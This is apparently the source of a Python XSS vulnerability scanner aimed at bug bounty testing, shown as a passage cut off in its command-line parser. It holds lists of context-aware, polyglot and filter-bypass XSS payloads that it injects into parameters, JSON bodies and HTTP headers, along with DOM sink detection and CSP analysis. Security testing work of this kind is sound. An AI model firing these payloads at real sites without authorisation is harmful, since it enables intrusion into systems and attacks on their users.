#!/usr/bin/env python3
"""
REVUEX XSS Framework v4.0-GOLD
==============================
Research-Grade XSS Detection Engine for Bug Bounty Professionals.

Techniques Included:
- Context-Aware Reflection Analysis
- DOM-XSS (Static + Runtime Correlation)
- Stored / Second-Order XSS
- Blind Stored XSS via Header Correlation
- CSP Trust Boundary Analysis
- ESPrima-Style JS Sink Parsing
- Framework-Aware DOM Sink Detection (React, Vue, Angular)
- Method & Content-Type Confusion
- Structural JSON Mutation
- Polyglot Payload Generation
- Encoding Bypass Techniques

Author: REVUEX Team
License: MIT (Private Research Use)
"""

import re
import json
import time
import copy
import argparse
import hashlib
from pathlib import Path
from enum import Enum
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, quote
from dataclasses import dataclass
import sys

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.base_scanner import (
    BaseScanner,
    Finding,
    ScanResult,
    Severity,
    ScanStatus,
)
from core.utils import (
    normalize_url,
    extract_domain,
    random_string,
    print_success,
    print_error,
    print_warning,
    print_info,
)


# =============================================================================
# CONSTANTS
# =============================================================================

SCANNER_NAME = "XSS Scanner GOLD"
SCANNER_VERSION = "3.5.0"

# DOM Sources - Where user input enters the DOM
DOM_SOURCES = [
    "location.hash",
    "location.search",
    "location.href",
    "location.pathname",
    "document.URL",
    "document.documentURI",
    "document.location",
    "document.referrer",
    "document.cookie",
    "window.name",
    "window.location",
    "history.pushState",
    "history.replaceState",
    "localStorage",
    "sessionStorage",
    "IndexedDB",
    "WebSocket",
    "postMessage",
    "FileReader",
    "XMLHttpRequest",
    "fetch",
]

# DOM Sinks - Where dangerous execution happens
DOM_SINKS = [
    "innerHTML",
    "outerHTML",
    "insertAdjacentHTML",
    "document.write",
    "document.writeln",
    "eval",
    "Function",
    "setTimeout",
    "setInterval",
    "setImmediate",
    "execScript",
    "crypto.generateCRMFRequest",
    "ScriptElement.src",
    "ScriptElement.text",
    "ScriptElement.textContent",
    "ScriptElement.innerText",
    "element.setAttribute",
    "element.src",
    "element.href",
    "element.action",
    "element.formAction",
    "location.assign",
    "location.replace",
    "window.open",
    "$.html",
    "$.append",
    "$.prepend",
    "$.after",
    "$.before",
    "$.replaceWith",
    "$.parseHTML",
]

# Framework-Specific Dangerous Sinks
FRAMEWORK_SINKS = [
    # React
    "dangerouslySetInnerHTML",
    "__html",
    # Vue
    "v-html",
    "v-bind:innerHTML",
    ":innerHTML",
    # Angular
    "[innerHTML]",
    "[outerHTML]",
    "bypassSecurityTrustHtml",
    "bypassSecurityTrustScript",
    "bypassSecurityTrustStyle",
    "bypassSecurityTrustUrl",
    "bypassSecurityTrustResourceUrl",
    # jQuery
    ".html(",
    ".append(",
    ".prepend(",
    # Svelte
    "{@html",
]

# Headers vulnerable to blind XSS
HEADER_VECTORS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Custom-IP-Authorization",
    "Client-IP",
    "True-Client-IP",
    "Origin",
    "Accept-Language",
    "Cookie",
]

# HTTP Methods for method confusion testing
HTTP_METHODS = ["GET", "POST", "PUT", "PATCH"]

# Content Types for content-type confusion
CONTENT_TYPES = [
    "application/json",
    "application/x-www-form-urlencoded",
    "text/plain",
    "text/html",
    "application/xml",
]

# XSS Contexts
class XSSContext(Enum):
    HTML_TEXT = "html_text"
    HTML_ATTRIBUTE = "html_attribute"
    HTML_ATTRIBUTE_UNQUOTED = "html_attribute_unquoted"
    JAVASCRIPT_STRING = "javascript_string"
    JAVASCRIPT_TEMPLATE = "javascript_template"
    URL_PARAM = "url_param"
    CSS_VALUE = "css_value"
    HTML_COMMENT = "html_comment"
    SCRIPT_BLOCK = "script_block"

# Context-aware payloads
CONTEXT_PAYLOADS = {
    XSSContext.HTML_TEXT: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ],
    XSSContext.HTML_ATTRIBUTE: [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '" onclick="alert(1)',
        "javascript:alert(1)",
        '" onload="alert(1)',
    ],
    XSSContext.HTML_ATTRIBUTE_UNQUOTED: [
        " onmouseover=alert(1)",
        " onfocus=alert(1) autofocus",
        " onclick=alert(1)",
        " onload=alert(1)",
    ],
    XSSContext.JAVASCRIPT_STRING: [
        "';alert(1);//",
        "\";alert(1);//",
        "</script><script>alert(1)</script>",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "\\';alert(1);//",
    ],
    XSSContext.JAVASCRIPT_TEMPLATE: [
        "${alert(1)}",
        "${constructor.constructor('alert(1)')()}",
        "{{constructor.constructor('alert(1)')()}}",
    ],
    XSSContext.URL_PARAM: [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:alert(1)",
    ],
}

# Polyglot payloads that work in multiple contexts
POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\"-->]]>*/--><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'-alert(1)-'",
    "<svg/onload=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
]

# Encoding bypass payloads
ENCODING_BYPASS_PAYLOADS = [
    # HTML entity encoding
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    # Double encoding
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # Unicode
    "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
    # Mixed case
    "<ScRiPt>alert(1)</sCrIpT>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    # Null bytes
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    # Newlines
    "<scr\nipt>alert(1)</scr\nipt>",
    # Tab
    "<scr\tipt>alert(1)</scr\tipt>",
]


# =============================================================================
# JSON MUTATION ENGINE
# =============================================================================

class MutationEngine:
    """Deep-copy recursive JSON mutation for structural integrity testing."""
    
    @staticmethod
    def mutate(obj: Any, target_key: str, payload: str) -> Any:
        """
        Recursively mutate a specific key in a JSON structure.
        
        Args:
            obj: JSON object (dict, list, or primitive)
            target_key: Key to inject payload into
            payload: XSS payload
        
        Returns:
            Mutated copy of the object
        """
        if isinstance(obj, dict):
            result = {}
            for key, value in obj.items():
                if key == target_key:
                    if isinstance(value, str):
                        result[key] = f"{value}{payload}"
                    elif isinstance(value, (int, float)):
                        result[key] = f"{value}{payload}"
                    else:
                        result[key] = value
                else:
                    result[key] = MutationEngine.mutate(value, target_key, payload)
            return result
        
        elif isinstance(obj, list):
            return [MutationEngine.mutate(item, target_key, payload) for item in obj]
        
        return obj


# =============================================================================
# ESPRIMA-STYLE JS ANALYZER
# =============================================================================

class JSAnalyzer:
    """Lightweight JavaScript static analysis for sink detection."""
    
    @staticmethod
    def find_sink_assignments(js_code: str) -> List[Dict[str, str]]:
        """
        Find dangerous sink assignments in JavaScript code.
        
        Args:
            js_code: JavaScript source code
        
        Returns:
            List of found sink assignments with details
        """
        findings = []
        
        # Tokenize (simplified)
        tokens = re.findall(r"[A-Za-z_$][\w$]*|\(|\)|=|\.|\[|\]|'[^']*'|\"[^\"]*\"", js_code)
        
        for i in range(len(tokens) - 2):
            # Check for direct sink assignments: sink = value
            if tokens[i] in DOM_SINKS and tokens[i + 1] == "=":
                findings.append({
                    "sink": tokens[i],
                    "type": "direct_assignment",
                    "context": " ".join(tokens[max(0, i-2):min(len(tokens), i+5)])
                })
            
            # Check for property assignments: element.innerHTML = value
            if tokens[i] == "." and i + 2 < len(tokens):
                if tokens[i + 1] in DOM_SINKS and tokens[i + 2] == "=":
                    findings.append({
                        "sink": tokens[i + 1],
                        "type": "property_assignment",
                        "context": " ".join(tokens[max(0, i-2):min(len(tokens), i+5)])
                    })
        
        return findings
    
    @staticmethod
    def find_source_to_sink_flow(js_code: str) -> List[Dict[str, Any]]:
        """
        Detect potential source-to-sink flows in JavaScript.
        
        Args:
            js_code: JavaScript source code
        
        Returns:
            List of potential flows
        """
        flows = []
        
        for source in DOM_SOURCES:
            if source in js_code:
                for sink in DOM_SINKS:
                    if sink in js_code:
                        # Check if they appear in same function/block (simplified)
                        source_pos = js_code.find(source)
                        sink_pos = js_code.find(sink)
                        
                        # If sink comes after source within reasonable distance
                        if 0 <= sink_pos - source_pos <= 500:
                            flows.append({
                                "source": source,
                                "sink": sink,
                                "distance": sink_pos - source_pos
                            })
        
        return flows


# =============================================================================
# CONTEXT ANALYZER
# =============================================================================

class ContextAnalyzer:
    """Analyze reflection context to determine XSS viability."""
    
    @staticmethod
    def detect_context(html: str, marker: str) -> Optional[XSSContext]:
        """
        Detect the context where a marker is reflected.
        
        Args:
            html: HTML response content
            marker: Unique marker to find
        
        Returns:
            Detected XSS context or None
        """
        if marker not in html:
            return None
        
        # Find marker position
        pos = html.find(marker)
        
        # Get surrounding context (500 chars before and after)
        start = max(0, pos - 500)
        end = min(len(html), pos + len(marker) + 500)
        context = html[start:end]
        
        # Determine context based on surrounding patterns
        before_marker = html[start:pos]
        
        # Check if inside script tag
        script_open = before_marker.rfind("<script")
        script_close = before_marker.rfind("</script")
        if script_open > script_close:
            # Inside script block
            # Check if inside string
            quote_count_single = before_marker[script_open:].count("'") - before_marker[script_open:].count("\\'")
            quote_count_double = before_marker[script_open:].count('"') - before_marker[script_open:].count('\\"')
            
            if quote_count_single % 2 == 1:
                return XSSContext.JAVASCRIPT_STRING
            elif quote_count_double % 2 == 1:
                return XSSContext.JAVASCRIPT_STRING
            elif "`" in before_marker[script_open:]:
                return XSSContext.JAVASCRIPT_TEMPLATE
            else:
                return XSSContext.SCRIPT_BLOCK
        
        # Check if inside HTML attribute
        attr_pattern = re.search(r'<[^>]+\s+\w+\s*=\s*["\']?[^"\'<>]*$', before_marker)
        if attr_pattern:
            if before_marker.rstrip()[-1] in ['"', "'"]:
                return XSSContext.HTML_ATTRIBUTE
            else:
                return XSSContext.HTML_ATTRIBUTE_UNQUOTED
        
        # Check if inside style tag
        style_open = before_marker.rfind("<style")
        style_close = before_marker.rfind("</style")
        if style_open > style_close:
            return XSSContext.CSS_VALUE
        
        # Check if inside HTML comment
        comment_open = before_marker.rfind("<!--")
        comment_close = before_marker.rfind("-->")
        if comment_open > comment_close:
            return XSSContext.HTML_COMMENT
        
        # Check if in URL context (href, src, etc.)
        url_pattern = re.search(r'(?:href|src|action|formaction)\s*=\s*["\']?[^"\'<>]*$', before_marker, re.I)
        if url_pattern:
            return XSSContext.URL_PARAM
        
        # Default to HTML text context
        return XSSContext.HTML_TEXT


# =============================================================================
# INJECTION POINT DATACLASS
# =============================================================================

@dataclass
class InjectionPoint:
    """Represents a potential XSS injection point."""
    location: str       # "url", "path", "json", "header"
    key: Any           # Parameter name or path index
    value: Any         # Original value
    method: str = "GET"
    content_type: str = "text/html"
    
    @property
    def identifier(self) -> str:
        return f"{self.method}:{self.location}:{self.key}"


# =============================================================================
# XSS SCANNER GOLD CLASS
# =============================================================================

class XSSScanner(BaseScanner):
    """
    GOLD-tier XSS scanner with advanced detection techniques.
    
    Features:
    - Context-Aware Reflection Analysis
    - DOM-XSS (Static + Runtime Correlation)
    - Stored / Second-Order XSS
    - Blind Stored XSS via Header Correlation
    - CSP Trust Boundary Analysis
    - ESPrima-Style JS Sink Parsing
    - Framework-Aware DOM Sink Detection
    - Method & Content-Type Confusion
    - Structural JSON Mutation
    
    Usage:
        scanner = XSSScanner(
            target="https://example.com/search?q=test",
            json_body={"query": "test"},
        )
        result = scanner.run()
    """
    
    def __init__(
        self,
        target: str,
        json_body: Optional[Dict] = None,
        test_methods: bool = True,
        test_stored: bool = True,
        test_blind_headers: bool = True,
        test_dom: bool = True,
        callback_url: str = "",
        **kwargs
    ):
        """
        Initialize XSS GOLD Scanner.
        
        Args:
            target: Target URL to scan
            json_body: JSON body for POST/PUT requests
            test_methods: Test multiple HTTP methods
            test_stored: Test for stored XSS
            test_blind_headers: Test for blind header XSS
            test_dom: Test for DOM-based XSS
            callback_url: Callback URL for blind XSS
            **kwargs: Additional BaseScanner arguments
        """
        super().__init__(
            name="XSSScanner",
            description="Cross-Site Scripting scanner",
            target=target,
            **kwargs
        )
        
        self.json_body = json_body or {}
        self.test_methods = test_methods
        self.test_stored = test_stored
        self.test_blind_headers = test_blind_headers
        self.test_dom = test_dom
        self.callback_url = callback_url
        
        # Detection state
        self.vulnerable_points: Set[str] = set()
        self.markers: Set[str] = set()
        self.csp_info: Dict[str, Any] = {}
        self.detected_contexts: Dict[str, XSSContext] = {}
        
        # Scanner info
        self.scanner_name = SCANNER_NAME
        self.scanner_version = SCANNER_VERSION
    
    def _validate_target(self) -> bool:
        """Validate target is accessible."""
        try:
            response = self.session.get(
                self.target,
                timeout=self.timeout,
                allow_redirects=True
            )
            return response.status_code < 500
        except Exception as e:
            self.logger.error(f"Target validation failed: {e}")
            return False
    
    def scan(self) -> None:
        """Execute the GOLD XSS scan."""
        self.logger.info(f"Starting XSS GOLD scan on {self.target}")
        
        # Analyze CSP first
        self._analyze_csp()
        
        # Get all injection points
        injection_points = self._get_injection_points()
        
        if not injection_points:
            self.logger.warning("No injection points found")
        else:
            self.logger.info(f"Found {len(injection_points)} injection point(s)")
        
        # Test each injection point
        for point in injection_points:
            methods = HTTP_METHODS if self.test_methods else [point.method]
            
            for method in methods:
                point.method = method
                
                if point.identifier in self.vulnerable_points:
                    continue
                
                self.logger.debug(f"Testing {method} -> {point.key}")
                
                # 1. Context-aware reflection testing
                self._test_reflection_context(point)
                
                # 2. DOM-XSS testing
                if self.test_dom:
                    self._test_dom_xss(point)
                
                # 3. Stored XSS testing
                if self.test_stored:
                    self._test_stored_xss(point)
        
        # 4. Blind header XSS testing
        if self.test_blind_headers:
            self._test_blind_header_xss()
        
        self.logger.info(f"XSS GOLD scan complete. Found {len(self.findings)} issue(s)")
    
    # =========================================================================
    # INJECTION POINT DISCOVERY
    # =========================================================================
    
    def _get_injection_points(self) -> List[InjectionPoint]:
        """
        Discover all potential XSS injection points.
        
        Returns:
            List of InjectionPoint objects
        """
        points = []
        parsed = urlparse(self.target)
        
        # 1. URL Query Parameters
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        for key, values in query_params.items():
            value = values[0] if values else ""
            points.append(InjectionPoint(
                location="url",
                key=key,
                value=value
            ))
        
        # 2. Path Segments
        path_parts = parsed.path.split("/")
        for i, part in enumerate(path_parts):
            if part and (part.isdigit() or any(c.isdigit() for c in part)):
                points.append(InjectionPoint(
                    location="path",
                    key=i,
                    value=part
                ))
        
        # 3. JSON Body
        if self.json_body:
            self._map_json_keys(self.json_body, points)
        
        return points
    
    def _map_json_keys(self, obj: Any, points: List[InjectionPoint], prefix: str = "") -> None:
        """Recursively map JSON keys as injection points."""
        if isinstance(obj, dict):
            for key, value in obj.items():
                if isinstance(value, (str, int, float)):
                    points.append(InjectionPoint(
                        location="json",
                        key=key,
                        value=value,
                        method="POST"
                    ))
                else:
                    self._map_json_keys(value, points, f"{prefix}.{key}" if prefix else key)
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                self._map_json_keys(item, points, f"{prefix}[{i}]")
    
    # =========================================================================
    # REQUEST ENGINE
    # =========================================================================
    
    def _send_request(
        self,
        point: InjectionPoint,
        payload: str
    ) -> Optional[Any]:
        """
        Send request with XSS payload.
        
        Args:
            point: Injection point
            payload: XSS payload
        
        Returns:
            Response object or None
        """
        self.rate_limiter.acquire()
        self.request_count += 1
        
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query, keep_blank_values=True)
        data = None
        headers = dict(self.session.headers)
        
        if point.location == "url":
            params[point.key] = [payload]
        
        elif point.location == "path":
            parts = parsed.path.split("/")
            if isinstance(point.key, int) and point.key < len(parts):
                parts[point.key] = quote(payload, safe="")
                parsed = parsed._replace(path="/".join(parts))
        
        elif point.location == "json":
            mutated = MutationEngine.mutate(
                copy.deepcopy(self.json_body),
                point.key,
                payload
            )
            data = json.dumps(mutated)
            headers["Content-Type"] = "application/json"
        
        url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
        
        try:
            response = self.session.request(
                method=point.method,
                url=url,
                data=data,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=True
            )
            time.sleep(self.delay)
            return response
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return None
    
    # =========================================================================
    # CONTEXT-AWARE REFLECTION TESTING
    # =========================================================================
    
    def _test_reflection_context(self, point: InjectionPoint) -> None:
        """
        Test for reflected XSS with context awareness.
        
        Injects a unique marker, detects reflection context,
        then sends context-appropriate payloads.
        """
        # Generate unique marker
        marker = f"RXSS{hashlib.md5(f'{point.key}{time.time()}'.encode()).hexdigest()[:8]}"
        
        # Send marker to detect reflection
        response = self._send_request(point, marker)
        if not response or marker not in response.text:
            return
        
        # Detect reflection context
        context = ContextAnalyzer.detect_context(response.text, marker)
        if not context:
            return
        
        self.detected_contexts[point.identifier] = context
        self.logger.debug(f"Detected context for {point.key}: {context.value}")
        
        # Get context-specific payloads
        payloads = CONTEXT_PAYLOADS.get(context, [])
        
        # Also add polyglot payloads
        payloads = payloads + POLYGLOT_PAYLOADS[:3]
        
        # Test payloads
        for payload in payloads:
            if point.identifier in self.vulnerable_points:
                break
            
            test_marker = f"XSS{hashlib.md5(payload.encode()).hexdigest()[:6]}"
            test_payload = payload.replace("alert(1)", f"alert('{test_marker}')")
            
            resp = self._send_request(point, test_payload)
            if resp and self._verify_xss_reflection(resp.text, test_payload, context):
                self.vulnerable_points.add(point.identifier)
                
                finding = Finding(
                    id=self._generate_finding_id(f"xss_reflected_{point.key}"),
                    title=f"Reflected XSS ({context.value})",
                    severity=Severity.HIGH,
                    description=(
                        f"Reflected Cross-Site Scripting vulnerability detected in '{point.key}' "
                        f"parameter. The input is reflected in {context.value} context without "
                        f"proper sanitization."
                    ),
                    url=self.target,
                    parameter=str(point.key),
                    method=point.method,
                    payload=test_payload,
                    evidence=f"Context: {context.value}, Marker reflected with payload intact",
                    impact=(
                        "An attacker can execute arbitrary JavaScript in victim's browser:\n"
                        "- Steal session cookies and tokens\n"
                        "- Perform actions as the victim\n"
                        "- Redirect to phishing pages\n"
                        "- Keylog sensitive input\n"
                        "- Deface the application"
                    ),
                    remediation=(
                        "1. Implement context-aware output encoding\n"
                        "2. Use Content Security Policy (CSP)\n"
                        "3. Set HttpOnly flag on sensitive cookies\n"
                        "4. Validate and sanitize all user input\n"
                        "5. Use modern frameworks with auto-escaping"
                    ),
                    vulnerability_type="xss",
                    confidence="high",
                )
                self.add_finding(finding)
                self._print_poc(point, test_payload, resp)
                break
    
    def _verify_xss_reflection(self, html: str, payload: str, context: XSSContext) -> bool:
        """Verify that XSS payload is reflected in exploitable form."""
        # Check for key payload indicators based on context
        if context == XSSContext.HTML_TEXT:
            return any(tag in html for tag in ["<script", "<img", "<svg", "<iframe", "onerror=", "onload="])
        
        elif context in [XSSContext.HTML_ATTRIBUTE, XSSContext.HTML_ATTRIBUTE_UNQUOTED]:
            return any(attr in html for attr in ["onmouseover=", "onfocus=", "onclick=", "onerror="])
        
        elif context in [XSSContext.JAVASCRIPT_STRING, XSSContext.JAVASCRIPT_TEMPLATE, XSSContext.SCRIPT_BLOCK]:
            return "alert(" in html or "alert`" in html
        
        elif context == XSSContext.URL_PARAM:
            return "javascript:" in html or "data:" in html
        
        return payload in html
    
    # =========================================================================
    # DOM-XSS TESTING
    # =========================================================================
    
    def _test_dom_xss(self, point: InjectionPoint) -> None:
        """
        Test for DOM-based XSS vulnerabilities.
        
        Combines static analysis with runtime correlation:
        1. Detect DOM sources and sinks in response
        2. Analyze JavaScript for dangerous flows
        3. Check for framework-specific sinks
        """
        if point.identifier in self.vulnerable_points:
            return
        
        # Generate marker
        marker = f"DOMXSS{hashlib.md5(f'{point.key}'.encode()).hexdigest()[:6]}"
        
        response = self._send_request(point, marker)
        if not response:
            return
        
        html = response.text
        
        # Check if marker is reflected
        if marker not in html:
            return
        
        # Static analysis
        has_source = any(source in html for source in DOM_SOURCES)
        has_sink = any(sink in html for sink in DOM_SINKS)
        has_framework_sink = any(sink in html for sink in FRAMEWORK_SINKS)
        
        # JavaScript analysis
        js_sink_findings = JSAnalyzer.find_sink_assignments(html)
        js_flows = JSAnalyzer.find_source_to_sink_flow(html)
        
        # Determine if DOM-XSS is likely
        dom_xss_indicators = []
        
        if has_source and has_sink:
            dom_xss_indicators.append("DOM source and sink present")
        
        if has_framework_sink:
            dom_xss_indicators.append(f"Framework sink detected")
        
        if js_sink_findings:
            dom_xss_indicators.append(f"JS sink assignments: {len(js_sink_findings)}")
        
        if js_flows:
            dom_xss_indicators.append(f"Source-to-sink flows: {len(js_flows)}")
        
        if dom_xss_indicators:
            self.vulnerable_points.add(point.identifier)
            
            # Determine severity based on indicators
            severity = Severity.HIGH if (has_source and has_sink) or js_flows else Severity.MEDIUM
            
            finding = Finding(
                id=self._generate_finding_id(f"xss_dom_{point.key}"),
                title="DOM-XSS (Source → Sink Flow)",
                severity=severity,
                description=(
                    f"DOM-based Cross-Site Scripting vulnerability detected. "
                    f"User input from '{point.key}' flows to dangerous DOM sinks. "
                    f"Indicators: {', '.join(dom_xss_indicators)}"
                ),
                url=self.target,
                parameter=str(point.key),
                method=point.method,
                payload=marker,
                evidence=(
                    f"Sources found: {[s for s in DOM_SOURCES if s in html][:3]}, "
                    f"Sinks found: {[s for s in DOM_SINKS if s in html][:3]}, "
                    f"Framework sinks: {[s for s in FRAMEWORK_SINKS if s in html]}"
                ),
                impact=(
                    "DOM-XSS executes entirely in the browser:\n"
                    "- Bypasses server-side security controls\n"
                    "- May not appear in server logs\n"
                    "- Can steal sensitive client-side data\n"
                    "- Full JavaScript execution in victim's context"
                ),
                remediation=(
                    "1. Avoid using dangerous sinks (innerHTML, eval, document.write)\n"
                    "2. Use textContent instead of innerHTML\n"
                    "3. Sanitize DOM sources before use\n"
                    "4. Implement CSP with strict-dynamic\n"
                    "5. Use DOMPurify for HTML sanitization"
                ),
                vulnerability_type="xss",
                confidence="medium" if severity == Severity.MEDIUM else "high",
            )
            self.add_finding(finding)
    
    # =========================================================================
    # STORED XSS TESTING
    # =========================================================================
    
    def _test_stored_xss(self, point: InjectionPoint) -> None:
        """
        Test for stored/second-order XSS.
        
        Injects a unique marker, then checks if it persists
        across subsequent requests.
        """
        if point.identifier in self.vulnerable_points:
            return
        
        # Generate unique marker for this test
        marker = f"STXSS{hashlib.md5(f'{point.key}{time.time()}'.encode()).hexdigest()[:8]}"
        self.markers.add(marker)
        
        # Inject marker
        self._send_request(point, marker)
        
        # Wait for potential storage
        time.sleep(1)
        
        # Check if marker persists
        try:
            check_response = self.session.get(self.target, timeout=self.timeout)
            
            # Check for any of our markers
            for stored_marker in self.markers:
                if stored_marker in check_response.text:
                    self.vulnerable_points.add(point.identifier)
                    
                    finding = Finding(
                        id=self._generate_finding_id(f"xss_stored_{point.key}"),
                        title="Stored/Second-Order XSS",
                        severity=Severity.CRITICAL,
                        description=(
                            f"Stored Cross-Site Scripting vulnerability detected in '{point.key}'. "
                            f"Injected content persists and is displayed to other users."
                        ),
                        url=self.target,
                        parameter=str(point.key),
                        method=point.method,
                        payload=stored_marker,
                        evidence=f"Marker '{stored_marker}' persisted in subsequent response",
                        impact=(
                            "CRITICAL: Stored XSS affects ALL users who view the page:\n"
                            "- Mass session hijacking\n"
                            "- Worm propagation\n"
                            "- Persistent defacement\n"
                            "- Credential harvesting at scale\n"
                            "- Malware distribution"
                        ),
                        remediation=(
                            "1. Sanitize ALL user input before storage\n"
                            "2. Encode output based on context\n"
                            "3. Implement strict CSP\n"
                            "4. Use HTML sanitization libraries\n"
                            "5. Regular security audits of stored content"
                        ),
                        vulnerability_type="xss",
                        confidence="high",
                    )
                    self.add_finding(finding)
                    print_success(f"Stored XSS found via {point.key}!")
                    break
                    
        except Exception as e:
            self.logger.debug(f"Stored XSS check failed: {e}")
    
    # =========================================================================
    # BLIND HEADER XSS TESTING
    # =========================================================================
    
    def _test_blind_header_xss(self) -> None:
        """
        Test for blind stored XSS via HTTP headers.
        
        Injects payloads into common headers that may be logged
        and displayed in admin panels.
        """
        marker = f"HXSS{hashlib.md5(f'{self.target}{time.time()}'.encode()).hexdigest()[:8]}"
        
        # Build XSS payload for headers
        payload = f"<img src=x onerror=alert('{marker}')>"
        
        # Inject into all header vectors
        headers = {header: payload for header in HEADER_VECTORS}
        headers.update(self.session.headers)
        
        try:
            # Send request with malicious headers
            self.session.get(self.target, headers=headers, timeout=self.timeout)
            self.request_count += 1
            
            # Wait for potential logging
            time.sleep(2)
            
            # Check if payload appears (may be in admin panel, logs view, etc.)
            check_response = self.session.get(self.target, timeout=self.timeout)
            self.request_count += 1
            
            if marker in check_response.text or payload in check_response.text:
                finding = Finding(
                    id=self._generate_finding_id("xss_blind_header"),
                    title="Blind Stored XSS via Header Injection",
                    severity=Severity.CRITICAL,
                    description=(
                        "Blind stored XSS vulnerability detected via HTTP header injection. "
                        "Malicious content in headers is stored and displayed, likely in "
                        "admin panels or log viewers."
                    ),
                    url=self.target,
                    parameter="HTTP Headers",
                    method="GET",
                    payload=f"Headers: {HEADER_VECTORS}",
                    evidence=f"Marker '{marker}' found in response after header injection",
                    impact=(
                        "CRITICAL: Header-based XSS typically targets administrators:\n"
                        "- Admin account compromise\n"
                        "- Privilege escalation\n"
                        "- Access to sensitive admin functions\n"
                        "- Full application takeover"
                    ),
                    remediation=(
                        "1. Sanitize all logged data before display\n"
                        "2. Encode headers in admin panels\n"
                        "3. Use CSP in admin interfaces\n"
                        "4. Implement log viewer security controls"
                    ),
                    vulnerability_type="xss",
                    confidence="high",
                )
                self.add_finding(finding)
                print_success("Blind Header XSS detected!")
                
        except Exception as e:
            self.logger.debug(f"Blind header XSS test failed: {e}")
    
    # =========================================================================
    # CSP ANALYSIS
    # =========================================================================
    
    def _analyze_csp(self) -> None:
        """
        Analyze Content Security Policy for XSS protections.
        """
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            self.request_count += 1
            
            csp = response.headers.get("Content-Security-Policy", "")
            csp_ro = response.headers.get("Content-Security-Policy-Report-Only", "")
            
            self.csp_info = {
                "present": bool(csp),
                "report_only": bool(csp_ro),
                "policy": csp or csp_ro,
            }
            
            if not csp and not csp_ro:
                print_warning("No Content Security Policy detected")
                
                finding = Finding(
                    id=self._generate_finding_id("csp_missing"),
                    title="Missing Content Security Policy",
                    severity=Severity.LOW,
                    description="No Content Security Policy header detected. CSP provides defense-in-depth against XSS.",
                    url=self.target,
                    parameter="HTTP Headers",
                    payload="N/A",
                    evidence="Content-Security-Policy header not present",
                    impact="Without CSP, XSS attacks are easier to exploit successfully.",
                    remediation=(
                        "Implement a strict CSP:\n"
                        "Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'"
                    ),
                    vulnerability_type="misconfiguration",
                    confidence="high",
                )
                self.add_finding(finding)
                
            else:
                policy = csp or csp_ro
                weaknesses = []
                
                if "unsafe-inline" in policy:
                    weaknesses.append("unsafe-inline allows inline scripts")
                
                if "unsafe-eval" in policy:
                    weaknesses.append("unsafe-eval allows eval()")
                
                if "data:" in policy:
                    weaknesses.append("data: URIs allowed")
                
                if "*" in policy:
                    weaknesses.append("Wildcard source allows any domain")
                
                if weaknesses:
                    print_warning(f"Weak CSP: {', '.join(weaknesses)}")
                    
                    finding = Finding(
                        id=self._generate_finding_id("csp_weak"),
                        title="Weak Content Security Policy",
                        severity=Severity.LOW,
                        description=f"CSP has weaknesses: {', '.join(weaknesses)}",
                        url=self.target,
                        parameter="Content-Security-Policy",
                        payload="N/A",
                        evidence=f"CSP: {policy[:200]}",
                        impact="Weak CSP may not effectively prevent XSS exploitation.",
                        remediation="Remove unsafe-inline, unsafe-eval, and wildcards from CSP.",
                        vulnerability_type="misconfiguration",
                        confidence="high",
                    )
                    self.add_finding(finding)
                else:
                    print_info(f"CSP present: {policy[:100]}...")
                    
        except Exception as e:
            self.logger.debug(f"CSP analysis failed: {e}")
    
    # =========================================================================
    # HELPERS
    # =========================================================================
    
    def _generate_finding_id(self, context: str) -> str:
        """Generate unique finding ID."""
        data = f"{self.target}:{context}:{datetime.now().isoformat()}"
        return hashlib.md5(data.encode()).hexdigest()[:12]
    
    def _print_poc(self, point: InjectionPoint, payload: str, response) -> None:
        """Print proof-of-concept details."""
        parsed = urlparse(self.target)
        
        print_success(f"XSS Found: {point.key} [{point.method}]")
        print(f"\n{'='*50}")
        print("PROOF OF CONCEPT")
        print(f"{'='*50}")
        print(f"Method: {point.method}")
        print(f"URL: {parsed.scheme}://{parsed.netloc}{parsed.path}")
        print(f"Parameter: {point.location}:{point.key}")
        print(f"Payload: {payload}")
        if point.identifier in self.detected_contexts:
            print(f"Context: {self.detected_contexts[point.identifier].value}")
        print(f"{'='*50}\n")


# =============================================================================
# CLI INTERFACE
# =============================================================================

def create_parser() -> argparse.ArgumentParser:
    """Create CLI argument parser."""
    parser = argparse.ArgumentParser(
        prog="revuex-xss",
        description="REVUEX XSS GOLD Scanner - Research-Grade XSS Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
